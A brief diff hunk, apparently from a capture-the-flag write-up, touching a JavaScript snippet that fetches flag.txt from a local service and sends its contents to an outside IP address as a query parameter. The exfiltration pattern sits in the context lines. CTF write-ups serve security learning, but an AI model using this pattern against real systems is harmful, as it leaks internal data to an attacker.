@@ -47,7 +47,6 @@ A quick and dirty way of doing this would be embedding ```flag.txt```'s contents
         const url = new URL("http://10.13.48.55");
         url.searchParams.append("data", data);
         fetch(url)
-            .then(response => response.text())
     }
 
     fetch("http://127.0.0.1:8080/flag.txt")
